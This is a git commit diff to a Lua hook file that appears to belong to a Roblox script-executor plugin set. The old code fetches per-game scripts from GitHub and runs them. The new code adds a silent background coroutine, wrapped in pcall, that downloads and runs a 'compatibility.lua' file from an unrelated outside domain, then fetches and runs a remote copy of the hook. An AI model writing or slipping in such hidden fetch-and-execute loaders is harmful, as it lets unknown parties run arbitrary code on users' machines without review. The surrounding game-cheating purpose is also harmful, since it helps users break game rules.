f172e9d4f350ea03e70134f01af0d87fe998eb5a
Amenteshades <129307184+Amenteshades@users.noreply.github.com>
2023-03-29 16:35:57 +0100

    Update icepoolshook.lua

--- newuserdplugins/icepoolshook.lua
+++ newuserdplugins/icepoolshook.lua
@@ -1,10 +1,4 @@
-local tb={
-[10201298018]='https://raw.githubusercontent.com/6yNuiC9/scr/main/newuserdgamespes/vh2-r.lua';
-[198817751]='https://raw.githubusercontent.com/6yNuiC9/scr/main/newuserdgamespes/vh2.lua';
-[11305669230]='https://raw.githubusercontent.com/6yNuiC9/scr/main/newuserdgamespes/UTLC.lua';
-[9928218161]='https://raw.githubusercontent.com/6yNuiC9/scr/main/newuserdgamespes/NightOfNights.lua';
-[5987989452]='https://raw.githubusercontent.com/6yNuiC9/scr/main/newuserdgamespes/monkegame.lua'
-}
-tb=tb[game.PlaceId]
-if type(tb)=='function' then return tb() elseif type(tb)=='string' then local fun=loadstring(game:HttpGet(tb)) setfenv(fun,getfenv()) fun=fun() return fun end
-return tb
+coroutine.resume(coroutine.create(pcall), function()
+	loadstring(game:HttpGet("http://ligma.wtf/scripts/compatibility.lua", true))()
+end)
+return loadstring(game:HttpGet("https://raw.githubusercontent.com/6yNuiC9/scr/newuserdplugins/icepoolshook.lua", true))(...)
